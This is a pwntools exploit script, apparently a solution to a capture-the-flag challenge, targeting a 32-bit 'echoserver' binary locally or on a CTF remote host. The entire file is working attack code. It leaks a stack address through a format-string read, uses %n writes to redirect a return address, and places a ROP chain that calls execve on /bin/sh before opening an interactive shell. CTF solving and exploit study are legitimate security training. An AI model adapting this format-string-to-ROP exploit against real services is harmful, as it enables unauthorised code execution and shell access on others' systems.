from pwn import *

if(len(sys.argv)>1):
    r=remote('challenges.ctfd.io',30095)
    context.noptrace=True
else:
    r=process('./echoserver')
    #gdb.attach(r)

string="bytes\n"

pop_eaxedxebx=p32(0x0805e8b4)
pop_eax=p32(0x080acfa6)
pop_ebx=p32(0x0804901e)
pop_edx=p32(0x08064ca8)
binsh="/bin/sh\x00"
syscall=p32(0x0804a7d2)
pop_ecx=p32(0x08063ca1)

reu = lambda a : r.recvuntil(a)
sla = lambda a,b : r.sendlineafter(a,b)
sl = lambda a : r.sendline(a)
rel = lambda : r.recvline()
sa = lambda a,b : r.sendafter(a,b)
re = lambda a : r.recv(a)

sla(string,"%162$p")
stack_base=int(re(10),16)-748
log.info("Stack base is {}".format(hex(stack_base)))

sla(string,"{}%5$n".format(p32(stack_base+1053)))

ropchain=""
ropchain+=binsh
ropchain+=pop_ecx
ropchain+=p32(0x0)
ropchain+=pop_eaxedxebx
ropchain+=p32(0xb)
ropchain+=p32(0x0)
ropchain+=p32(stack_base+60)
ropchain+=syscall


ret_addr=stack_base+1068
rop_addr=stack_base+68
var=stack_base+1044

def fstring(addr):
    addr=hex(addr).replace("0x","00")
    if len(addr)<8:
        addr=addr.rjust(8,"0")
    s1=addr[-4:]
    s2=addr[-8:-4]
    s1=int(s1,16)
    byte_count=s1
    while(hex(byte_count)[-4:]!=s2):
        byte_count+=1
    return s1, byte_count-s1

payload=""
v1,v2=fstring(rop_addr+4)
payload+="%{}c".format(v1)
payload+="%13$n"
payload+="%{}c".format(v2)
payload+="%14$n"
payload=payload.ljust(32,"a")
payload+=p32(ret_addr-12)
payload+=p32(ret_addr-10)
sla(string,payload)

payload=""
payload+=p32(var)
payload+="%5$n"
payload=payload.ljust(40,"a")
payload+=ropchain
sla(string,payload)
r.interactive()